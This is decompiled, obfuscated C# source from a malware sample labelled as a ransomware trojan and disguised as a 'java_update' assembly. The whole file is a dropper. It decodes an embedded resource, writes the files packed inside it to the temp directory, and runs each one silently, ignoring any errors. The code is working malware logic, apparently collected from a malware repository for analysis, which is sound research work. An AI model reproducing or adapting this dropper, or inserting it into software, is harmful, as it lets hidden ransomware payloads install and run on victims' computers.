// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.ŵኩỼčᧅᶞƳቼଵᑅݫ
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;

namespace ᏬĴவߙւ̞ᙘ
{
  internal class ŵኩỼčᧅᶞƳቼଵᑅݫ
  {
    public static void ᙽÍȷᆕည\u0A12ከȺᐔ᧘៥எᆯ\u0B49\u0FF5୫() => new Thread((ThreadStart) (() =>
    {
      BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A6B\u0FEAᛈᓎୣᵈ୧ᬈክᡉᕧҐ\u07BC\u0BF6((byte[]) new ResourceManager("b", Assembly.GetExecutingAssembly()).GetObject("b"), false)));
      while (binaryReader.PeekChar() != -1)
      {
        string str = binaryReader.ReadString();
        int count = binaryReader.ReadInt32();
        byte[] bytes = binaryReader.ReadBytes(count);
        try
        {
          if (!File.Exists(Path.GetTempPath() + str))
            File.WriteAllBytes(Path.GetTempPath() + str, bytes);
          Process.Start(Path.GetTempPath() + str);
        }
        catch
        {
        }
      }
    })).Start();
  }
}
